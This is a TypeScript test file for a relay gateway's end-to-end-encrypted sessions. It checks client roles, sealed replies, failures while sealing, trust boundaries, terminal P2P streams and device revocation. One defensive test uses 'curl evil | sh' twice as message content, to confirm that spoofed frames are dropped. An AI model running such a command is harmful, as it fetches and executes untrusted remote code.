/**
 * The gateway's rules, with real keys: what used to be one class (the socket held the link, the sessions
 * and the dispatch) is two, and these are the rules that crossed between them (docs/design/2026-10-06-core-boundary-next.md,
 * step 10). Each test fails if its rule is lost in the move: who a remote client is, as the core hears it;
 * that its role, never its frame, decides whether it is the owner; that its reply goes back sealed to it
 * alone; that a throw while sealing costs the relay its frame and nothing else; and the two trust edges the
 * split made visible, a window's connection id named by the relay and the backend hub's own frames sent by
 * a process on this computer. The rest of the relay's rules are held where they always were, through the
 * socket and its gateway together (backendSocket.spec.ts).
 */
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { BackendSocket } from '../backendSocket.js'
import type { Asker } from '../core/api.js'
import * as C from '../lib/e2ee/core.js'
import { TerminalBinaryKind } from '../lib/terminalBinary.js'
import { bindMessageRequest } from '../testing/socketCore.js'
import { dispatchDown, gatewayOf, relaySocket, upstreamOf } from '../testing/relaySocket.js'
import type { DeviceLogTrustOutcome } from '../lib/e2ee/deviceLogSyncer.js'
import { unknownHelloReader } from './start.js'

/** The machine the sessions are bound to: every hello and welcome is signed over it. */
const MACHINE = 'a1b2c3d4e5f60718293a4b5c6d7e8f90'

afterEach(() => vi.restoreAllMocks())

type Frame = Record<string, unknown>

/** What the gateway queued for the relay, addressed to one connection. */
const queuedFor = (socket: BackendSocket, connId: string): Frame[] =>
  upstreamOf(socket).queue.map((item) => item.msg as { targetConnId?: string; frame?: Frame })
    .filter((msg) => msg.targetConnId === connId).map((msg) => msg.frame!)

/** A paired client with a live session on `connId`: it proves its identity with a hello and reads the
 *  welcome, as the phone app does, so what it seals opens under the gateway's real session. */
async function pairedClient(socket: BackendSocket, connId: string, opts: { role?: 'web' | 'device'; label?: string } = {}) {
  const gateway = gatewayOf(socket)
  const identity = C.newIdentity()
  const pub = C.b64e(identity.pub)
  const store = (gateway.e2ee as unknown as { store: { addPaired(pub: string, label: string, at: number, role: string): void } }).store
  store.addPaired(pub, opts.label ?? 'Dee’s phone', Date.now(), opts.role ?? 'web')
  const eph = C.newEphemeral()
  await dispatchDown(socket, { type: 'e2e_hello', payload: { identityPub: pub, ephPub: C.b64e(eph.pub), sig: C.b64e(C.helloSig(identity.priv, MACHINE, eph.pub)) } }, connId)
  const welcome = queuedFor(socket, connId).find((frame) => frame.type === 'e2e_welcome')!
  const p = welcome.payload as Record<string, string>
  const keys = C.sessionKeys(eph.priv, C.b64d(p.ephPub), MACHINE, eph.pub, C.b64d(p.ephPub))
  let sent = 0
  return {
    pub,
    seal: (type: string, payload: Record<string, unknown>): Frame => ({ type, payload: C.wrapPayload(keys.c2s, 'p', sent++, type, undefined, payload) }),
    open: (frame: Frame): unknown => C.unwrapPayload(keys.s2c, (frame.payload as C.WrappedPayload).__e2e, String(frame.type), undefined),
  }
}

describe('a remote client, as the core hears it', () => {
  it('is registered with the role and label its session proved, and forgotten when the relay says it left', async () => {
    const socket = relaySocket(MACHINE)
    expect(socket.remoteClient('phone-1')).toBeNull()
    const phone = await pairedClient(socket, 'phone-1', { label: 'Dee’s phone' })
    expect(socket.remoteClient('phone-1')).toEqual({ role: 'web', label: 'Dee’s phone', identity: phone.pub, direct: false })
    await dispatchDown(socket, { type: '__client_disconnected', payload: {} }, 'phone-1')
    expect(socket.remoteClient('phone-1')).toBeNull()
    await socket.stop()
  })

  it('asks as the owner only with a web session, whatever its frame says', async () => {
    const socket = relaySocket(MACHINE)
    const asked: Array<{ type: string; asker: Asker }> = []
    socket.serviceRouter = (type, _payload, asker, reply) => { asked.push({ type, asker }); reply({ ok: true }); return true }
    const phone = await pairedClient(socket, 'phone-1', { role: 'web' })
    const dial = await pairedClient(socket, 'dial-1', { role: 'device', label: 'Desk dial' })
    // A field in the payload claiming the owner's role is the sender's word; the session is the gateway's.
    await dispatchDown(socket, phone.seal('dsh_list', { requestId: 'p', owner: false }), 'phone-1')
    await dispatchDown(socket, dial.seal('dsh_list', { requestId: 'd', owner: true, local: true, role: 'web' }), 'dial-1')
    // With the connection and the request id it asked under, which a service keys a connection's own work by.
    expect(asked).toEqual([
      { type: 'dsh_list', asker: { local: false, owner: true, connection: 'phone-1', requestId: 'p' } },
      { type: 'dsh_list', asker: { local: false, owner: false, connection: 'dial-1', requestId: 'd' } },
    ])
    await socket.stop()
  })

  it('gets its reply sealed to it alone: no other client and no window hears it', async () => {
    const socket = relaySocket(MACHINE)
    const window: Frame[] = []
    socket.registerLocalClient('local:window', { sendFrame: (frame) => { window.push(frame); return true }, sendBinary: () => true })
    socket.serviceRouter = (_type, _payload, _asker, reply) => { reply({ harnesses: ['secret-harness'] }); return true }
    const phone = await pairedClient(socket, 'phone-1')
    await pairedClient(socket, 'phone-2')
    await dispatchDown(socket, phone.seal('dsh_list', { requestId: 'r-1' }), 'phone-1')
    const replies = queuedFor(socket, 'phone-1').filter((frame) => frame.type === 'dsh_list_result')
    expect(replies).toHaveLength(1)
    expect(JSON.stringify(replies)).not.toContain('secret-harness')
    expect(phone.open(replies[0])).toEqual({ requestId: 'r-1', harnesses: ['secret-harness'] })
    expect(JSON.stringify(queuedFor(socket, 'phone-2'))).not.toContain('dsh_list_result')
    expect(JSON.stringify(upstreamOf(socket).queue.filter((item) => !(item.msg as { targetConnId?: string }).targetConnId))).not.toContain('secret-harness')
    expect(window.filter((frame) => frame.type === 'dsh_list_result')).toEqual([])
    await socket.unregisterLocalClient('local:window')
    await socket.stop()
  })

  it('whose session went while its request ran gets a bare E2EE_REQUIRED, never the answer in the clear', async () => {
    const socket = relaySocket(MACHINE)
    let answer!: (result: Record<string, unknown>) => void
    socket.serviceRouter = (_type, _payload, _asker, reply) => { answer = reply; return true }
    const phone = await pairedClient(socket, 'phone-1')
    await dispatchDown(socket, phone.seal('dsh_list', { requestId: 'r-1' }), 'phone-1')
    gatewayOf(socket).e2ee.dropSession('phone-1')
    expect(socket.remoteClient('phone-1')).toBeNull()
    answer({ harnesses: ['secret-harness'] })
    expect(queuedFor(socket, 'phone-1').filter((frame) => frame.type === 'dsh_list_result'))
      .toEqual([{ type: 'dsh_list_result', payload: { requestId: 'r-1', error: 'E2EE_REQUIRED' } }])
    await socket.stop()
  })
})

describe('sealing, guarded', () => {
  it('a throw while the gateway seals a frame costs the relay that frame, never the windows here or the caller', async () => {
    const socket = relaySocket(MACHINE)
    const window: Frame[] = []
    const error = vi.spyOn(console, 'error').mockImplementation(() => {})
    socket.registerLocalClient('local:window', { sendFrame: (frame) => { window.push(frame); return true }, sendBinary: () => true })
    const e2ee = gatewayOf(socket).e2ee
    vi.spyOn(e2ee, 'wrapUp').mockImplementation(() => { throw new Error('sealing broke') })
    vi.spyOn(e2ee, 'wrapCommander').mockImplementation(() => { throw new Error('sealing broke') })
    // The event funnel sends every event of a batch in turn: one that cannot be sealed must not stop the next.
    expect(() => {
      socket.send({ type: 'turn_started', agentId: 'a1', payload: { userMessage: 'one' } })
      socket.sendCommander({ type: 'commander_event', agentId: 'a1', payload: { kind: 'processing' } })
      socket.send({ type: 'turn_ended', agentId: 'a1', payload: {} })
    }).not.toThrow()
    expect(window.map((frame) => frame.type)).toEqual(['turn_started', 'turn_ended'])
    // Said once, then counted, so a broken seal does not flood the log with one line per event.
    expect(error).toHaveBeenCalledTimes(1)
    expect(String(error.mock.calls[0][0])).toContain('sealing broke')
    // A terminal frame that cannot be sealed is one that was not sent: its stream closes, nothing throws.
    vi.spyOn(e2ee, 'wrapTarget').mockImplementation(() => { throw new Error('sealing broke') })
    vi.spyOn(e2ee, 'wrapTerminalBinary').mockImplementation(() => { throw new Error('sealing broke') })
    expect(socket.sendTerminalTo('phone-1', 'terminal_ready', { streamId: 's' })).toBe(false)
    expect(socket.sendTerminalBinaryTo('phone-1', { kind: TerminalBinaryKind.output, streamId: 's', seq: 1, compressed: false, bytes: new Uint8Array(1) })).toBe(false)
    expect(error).toHaveBeenCalledTimes(1)
    // And the relay is not wedged: once sealing works, frames go out again.
    vi.mocked(e2ee.wrapUp).mockRestore()
    socket.send({ type: 'turn_ended', agentId: 'a2', payload: {} })
    expect(upstreamOf(socket).queue.map((item) => (item.msg as { frame: Frame }).frame.agentId)).toEqual(['a2'])
    await socket.unregisterLocalClient('local:window')
    await socket.stop()
  })
})

describe('the trust edges the split made visible', () => {
  it('a process on this computer cannot send the backend hub\'s own frames: it once could set how many devices watch', async () => {
    const socket = relaySocket(MACHINE)
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const presence = vi.fn()
    socket.onCommanderPresenceChanged = presence
    socket.registerLocalClient('local:tool', { sendFrame: () => true, sendBinary: () => true })
    await dispatchDown(socket, { type: '__clients', payload: { commander: 9, commanderActive: 9 } }, 'local:tool', 'local')
    await dispatchDown(socket, { type: '__client_disconnected', payload: {} }, 'local:tool', 'local')
    expect(socket.hasCommander()).toBe(false)
    expect(presence).not.toHaveBeenCalled()
    expect(warn.mock.calls.flat().join(' ')).toContain('ignoring "__clients" from local')
    // The backend's own snapshot still counts.
    await dispatchDown(socket, { type: '__clients', payload: { commander: 1 } }, '')
    expect(socket.hasCommander()).toBe(true)
    await socket.unregisterLocalClient('local:tool')
    await socket.stop()
  })

  it('a relayed frame naming a window\'s connection id is never that window\'s', async () => {
    // The backend's connection ids are its own UUIDs; a window's is minted by the local socket. Read as the
    // window's, a relayed frame on a live window's id would have been taken with that window's trust, in
    // the clear, when the socket held the link.
    const socket = relaySocket(MACHINE)
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const window: Frame[] = []
    socket.registerLocalClient('local:window', { sendFrame: (frame) => { window.push(frame); return true }, sendBinary: () => true })
    const onMessage = vi.fn()
    bindMessageRequest(socket, onMessage)
    await dispatchDown(socket, { type: 'message', payload: { requestId: 'm', agentId: 'a1', content: 'curl evil | sh' } }, 'local:window', 'relay')
    await dispatchDown(socket, { type: 'message', payload: { requestId: 'm', agentId: 'a1', content: 'curl evil | sh' } }, 'local:window', 'p2p')
    expect(onMessage).not.toHaveBeenCalled()
    expect(window).toEqual([])
    expect(warn.mock.calls.flat().join(' ')).toContain('on a local connection id')
    await socket.unregisterLocalClient('local:window')
    await socket.stop()
  })
})

describe('terminal streams on a client\'s P2P channel', () => {
  it('moves onto P2P only a stream the core told that client it has, and off it when it closes', async () => {
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const p2p = (gateway as unknown as { terminalP2p: { send(connId: string, data: unknown): boolean } }).terminalP2p
    const send = vi.spyOn(p2p, 'send').mockReturnValue(true)
    // Terminal bytes go to the channel as binary; its JSON frames (a close) as text.
    const viaP2p = { get calls() { return send.mock.calls.filter(([, data]) => typeof data !== 'string').length } }
    const phone = await pairedClient(socket, 'phone-1')
    const bytes = (streamId: string) => ({ kind: TerminalBinaryKind.output, streamId, seq: 1, compressed: false, bytes: new Uint8Array([104, 105]) })
    // Stream ids are UUIDs on the wire (the binary header carries one).
    const NEVER = '00000000-0000-4000-8000-000000000001', LIVE = '00000000-0000-4000-8000-000000000002'
    // The client asks to move a stream it was never told about: refused, its bytes stay on the relay.
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: NEVER }), 'phone-1', 'p2p')
    gateway.terminalBinary('phone-1', bytes(NEVER))
    expect(viaP2p.calls).toBe(0)
    // Told it has one, it may move it.
    expect(gateway.terminal('phone-1', 'terminal_ready', { requestId: 'open-1', streamId: LIVE })).toBe(false) // no link: nothing sent
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: LIVE }), 'phone-1', 'p2p')
    gateway.terminalBinary('phone-1', bytes(LIVE))
    expect(viaP2p.calls).toBe(1)
    // Closed, it is off P2P: a resync for it cannot put it back.
    gateway.terminal('phone-1', 'terminal_closed', { streamId: LIVE })
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: LIVE }), 'phone-1', 'p2p')
    gateway.terminalBinary('phone-1', bytes(LIVE))
    expect(viaP2p.calls).toBe(1)
    await socket.stop()
  })
})

describe('the Wi-Fi device, over the gateway\'s sessions', () => {
  it('an unpaired device is told so, sealed, while its session still stands, and the service forgets it after', async () => {
    // The device clears its own pin on this frame; told after its session is gone, it could not open it
    // and would show "paired, disconnected" for ever (lib/autonomous-device/relay.ts `revoke`).
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const revoked = vi.fn()
    socket.fromGateway.deviceRevoked = revoked
    const dial = await pairedClient(socket, 'dial-1', { role: 'device', label: 'Desk dial' })
    gateway.deviceClient('dial-1', dial.pub)
    gateway.revoke(C.fingerprint(C.b64d(dial.pub)))
    const told = queuedFor(socket, 'dial-1').map((frame) => frame.type)
    expect(told.indexOf('autonomous_device_event')).toBeGreaterThanOrEqual(0)
    expect(told.indexOf('autonomous_device_event')).toBeLessThan(told.indexOf('e2e_denied'))
    const event = queuedFor(socket, 'dial-1').find((frame) => frame.type === 'autonomous_device_event')!
    expect(dial.open(event)).toEqual({ type: 'pair.revoke', machineId: MACHINE })
    // The service hears of it once the session is gone, so its relay has nobody left to tell twice.
    expect(revoked).not.toHaveBeenCalled()
    expect(socket.remoteClient('dial-1')).toBeNull()
    await new Promise((done) => setImmediate(done))
    expect(revoked).toHaveBeenCalledWith(dial.pub)
    await socket.stop()
  })

  it('opens a device\'s request only when the relay would, and hands it on with the frame as it came', async () => {
    const socket = relaySocket(MACHINE)
    const heard = vi.fn()
    socket.fromGateway.device = heard
    const dial = await pairedClient(socket, 'dial-1', { role: 'device', label: 'Desk dial' })
    const phone = await pairedClient(socket, 'phone-1')
    const sealed = dial.seal('autonomous_device_request', { type: 'hello', proto: 1, requestId: 'h' })
    await dispatchDown(socket, sealed, 'dial-1')
    expect(heard).toHaveBeenLastCalledWith('dial-1', sealed, { type: 'autonomous_device_request', payload: { type: 'hello', proto: 1, requestId: 'h' } })
    // A web session's, an unsealed one, or one beside a session id: never opened, as the relay never did.
    const fromPhone = phone.seal('autonomous_device_request', { type: 'hello' })
    await dispatchDown(socket, fromPhone, 'phone-1')
    expect(heard).toHaveBeenLastCalledWith('phone-1', fromPhone, null)
    await dispatchDown(socket, { type: 'autonomous_device_request', payload: { type: 'hello' } }, 'dial-1')
    expect(heard.mock.lastCall?.[2]).toBeNull()
    const withSession = { ...dial.seal('autonomous_device_request', { type: 'hello' }), dbSessionId: 's1' }
    await dispatchDown(socket, withSession, 'dial-1')
    expect(heard.mock.lastCall?.[2]).toBeNull()
    await socket.stop()
  })
})

describe('a hello from a key the device key log may name', () => {
  it('waits for the gateway to read the log, and opens the session the read trusted', async () => {
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const identity = C.newIdentity()
    const pub = C.b64e(identity.pub)
    const asked: string[] = []
    gateway.onUnknownHello = async (key) => { asked.push(key); gateway.trustPeer({ pub: key, label: 'Chrome · macOS', kind: 'viewer' }) }
    const eph = C.newEphemeral()
    await dispatchDown(socket, { type: 'e2e_hello', payload: { identityPub: pub, ephPub: C.b64e(eph.pub), sig: C.b64e(C.helloSig(identity.priv, MACHINE, eph.pub)) } }, 'web-1')
    await vi.waitFor(() => expect(queuedFor(socket, 'web-1').some((frame) => frame.type === 'e2e_welcome')).toBe(true))
    expect(asked).toEqual([pub])
    expect(socket.remoteClient('web-1')).toMatchObject({ role: 'web', identity: pub })
    await socket.stop()
  })
})

describe('unknownHelloReader', () => {
  const pub = C.b64e(C.newIdentity().pub)

  it('reads the log for a key, says what it found, and not again for the same key within ten seconds', async () => {
    let now = 1_000
    const lines: string[] = []
    const trustFromLog = vi.fn(async (): Promise<DeviceLogTrustOutcome> => 'absent')
    const read = unknownHelloReader({ trustFromLog }, (line) => lines.push(line), () => now)
    await read(pub)
    const fp = C.fingerprint(C.b64d(pub))
    expect(lines).toEqual([
      `[e2ee] hello from ${fp} is not paired here — re-reading the device log`,
      `[e2ee] ${fp}: not on the account's device list`,
    ])
    now += 9_999
    await read(pub)
    expect(trustFromLog).toHaveBeenCalledTimes(1)
    now += 1
    trustFromLog.mockResolvedValueOnce('trusted')
    await read(pub)
    expect(trustFromLog).toHaveBeenCalledTimes(2)
    expect(lines.at(-1)).toBe(`[e2ee] ${fp}: trusted: it is on the account's device list`)
  })

  it('makes a hello said again while the read is on its way wait for that read, not be denied at once', async () => {
    let finish!: (outcome: DeviceLogTrustOutcome) => void
    const trustFromLog = vi.fn(() => new Promise<DeviceLogTrustOutcome>((resolve) => { finish = resolve }))
    const read = unknownHelloReader({ trustFromLog }, () => {}, () => 1_000)
    let firstDone = false
    let againDone = false
    void read(pub).then(() => { firstDone = true })
    void read(pub).then(() => { againDone = true })
    await Promise.resolve()
    expect(againDone).toBe(false)
    finish('trusted')
    await new Promise((resolve) => setTimeout(resolve, 0))
    expect([firstDone, againDone]).toEqual([true, true])
    expect(trustFromLog).toHaveBeenCalledTimes(1)
  })
})
